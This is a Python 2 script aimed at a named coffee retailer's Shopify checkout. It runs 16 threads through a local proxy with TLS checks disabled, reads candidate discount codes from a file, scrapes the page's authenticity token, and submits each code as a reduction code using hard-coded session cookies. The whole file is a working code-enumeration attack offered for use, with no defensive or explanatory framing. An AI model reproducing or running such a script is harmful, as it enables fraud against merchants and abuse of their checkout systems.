# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
from threading import Thread

proxy = '127.0.0.1:8888'
requests.packages.urllib3.disable_warnings()
url = 'https://www.deathwishcoffee.com/2717209/checkouts/e6ae67095e72cc0a6a502beaed6fd98d?previous_step=contact_information&step=shipping_method'
cookie = 'checkout=BAhJIiVkYjkzMGM1NzM4OTE0MjQyZWZlZDExMTdlNmI3YTM2OQY6BkVU--7e7c9f6c385b334264d519fd0af4dcc34baee10a; previous_checkout_token=BAhJIiVmN2U1NTNlOTUzYWQ3Yjg4ZWE1NjYzNTk2YzI5YmE3OAY6BkVU--00a2dd57000d45a5cf81da5cb92677984ff0714c; tracked_start_checkout=e6ae67095e72cc0a6a502beaed6fd98d; checkout_token=BAhJIiVlNmFlNjcwOTVlNzJjYzBhNmE1MDJiZWFlZDZmZDk4ZAY6BkVU--d881f79ef0afa9b9bac5f5d5c719103a726044c1; session-set=true; _orig_referrer=; _landing_page=%2F2717209%2Fcheckouts%2Fcaa513fb2bb5731938ca2f9747aee8cf%2Fthank_you; customer_sig=; _secure_session_id=c7eaa0feda1d81520e95dd1b5d1d2014; _gat=1; _shopify_visit=t; _shopify_uniq=x; fsb_previous_pathname=/cart; _shopify_ga=_ga=1.186850792.1751560579.1482099256; _shopify_ctd=A4ambWV0aG9kAqplbnRyeV90aW1ly0HWHw7tBxqgpHBhc3PDqHJlZGlyZWN0w6t0YXJnZXRfcGF0aKUvY2FydKpjYXJ0X3Rva2VusNqmo8VP0OpOey3Aw1Nj8TI=-/FIrlbzI57LbrZnIsg3sdE6p+Ks=; cart=daa6a3c54fd0ea4e7b2dc0c35363f132; secure_customer_sig=; cart_sig=62d82b974405502b177ead6c9a381609; _y=E4E4C62D-1B11-4870-AF95; _s=5EE9DBED-7E08-405B-973B; _shopify_fs=2016-12-18T22%3A14%3A16.262Z; _ga=GA1.2.1751560579.1482099256; _shopify_s=5EE9DBED-7E08-405B-973B; _shopify_y=E4E4C62D-1B11-4870-AF95'

def main(q):
	i = 0
	while True:
		code = q.get()
		prozy = {
			'http': proxy,
			'https': proxy
		}
		s = requests.session()
		user = str(random.randint(99999999,99999999999))
		work = False
		s.cookies.clear()
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
			'Accept-Encoding': 'gzip',
			'Referer': 'https://www.misthub.com/account',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': cookie
		}
		r = s.get(
					url,
					verify=False,
					proxies=prozy,
					timeout=12,
					headers=headers
				)
		auth = re.findall('authenticity_token" value="(.*?)"', r.text)[0]
		r = s.post(
					url,
					data='utf8=%E2%9C%93&_method=patch&authenticity_token={0}&step=contact_information&checkout%5Breduction_code%5D={1}&checkout%5Bclient_details%5D%5Bbrowser_width%5D=2400&checkout%5Bclient_details%5D%5Bbrowser_height%5D=1126&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1'.format(auth, code),
					verify=False,
					proxies=prozy,
					timeout=12,
					headers=headers
				)
		i += 1
		print 'Done', i
	
if __name__ == '__main__':
	with codecs.open('codes.txt', 'r', encoding='utf-8') as f:
		codes = f.readlines()
	queue = Queue.Queue()
	
	for _ in range(int(16)):
		worker = Thread(target=main, args=(queue,))
		worker.start()
	for user in codes:
		queue.put(user.strip().encode('ascii', 'ignore'))
